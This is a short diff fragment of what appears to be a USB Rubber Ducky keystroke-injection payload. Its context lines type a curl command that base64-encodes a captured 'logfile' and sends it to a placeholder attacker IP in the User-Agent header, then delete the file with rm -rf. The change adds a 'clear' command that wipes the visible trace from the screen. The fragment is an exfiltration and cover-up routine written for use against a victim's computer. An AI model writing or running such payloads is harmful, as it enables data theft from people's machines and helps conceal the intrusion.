@@ -72,6 +72,8 @@ QUACK STRING curl -A \`base64 -i logfile\` #YourIPaddressHere
 QUACK ENTER
 QUACK STRING rm -rf logfile
 QUACK ENTER
+QUACK STRING clear
+QUACK ENTER
 QUACK STRING exit
 QUACK ENTER
 QUACK STRING fi
